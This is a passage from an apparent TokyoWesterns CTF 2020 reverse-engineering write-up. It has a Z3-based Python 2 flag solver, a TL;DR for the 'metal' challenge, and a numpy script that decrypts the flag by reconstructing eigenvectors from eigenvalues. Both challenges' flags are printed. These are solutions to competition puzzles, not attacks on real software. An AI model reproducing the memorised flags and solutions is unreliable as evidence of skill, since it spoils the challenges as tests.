  for i in range(len(a)):
    re += a[i] * pp(num,i)
  return re
flag = ""
for a in aaa:
  s = Solver()
  ff = BitVec("flag",32)
  num = 0xffffffff
  print a[:-1]
  for i in range(35):
    print i
    num=calc([ff]+a[:-1],num) 
  s.add(num == a[-1])
  print s.check()
  print s.model()
  f = s.model()[ff].as_long()
  flag += hex(f)[2:].decode("hex")[::-1]
  print flag

```

4. flag = `TWCTF{Xm4r1n_15_4bl3_70_6en3r4t3_N471v3_C0d3_w17h_VS_3n73rpr153_bu7_17_c0n741n5_D07_N3t_B1n4ry}`
### metal
#### TL;DR
1. Disassemble the cisa binary file to visa asm.
2. Cleanup the syntax.
3. Manually decompiled it to pseudo code.
4. Construct the eigenvector (i.e. key) from eigenvalues.

Full writeup is at [here](https://sasdf.github.io/ctf/writeup/2020/tokyoWesterns/rev/metal/).

#### Decryption script
```python
import numpy as np

with open('flag.enc', 'rb') as f:
    data = f.read()

data = np.frombuffer(data, dtype=np.double).reshape(-1, 2, 8, 8)

flag = b''
for diag, enc in data:
    LA = diag[0]
    LM = diag[1:].reshape(8, 7)

    V = np.zeros_like(enc)
    for i in range(8):
        for j in range(8):
            lhs = np.sum(np.log(np.abs(LA[i] - np.concatenate([LA[:i], LA[i+1:]]))))
            rhs = np.sum(np.log(np.abs(LA[i] - LM[j])))
            V[i,j] = np.exp((rhs - lhs) / 2)

    dec = enc / V
    flag += np.round(dec).astype(np.uint8).tobytes()

with open('flag.png', 'wb') as f:
    f.write(flag)

#TWCTF{Is_it_possible_to_get_the_eigenvectors_of_a_matrix_using_only_its_eigenvalues?}

```
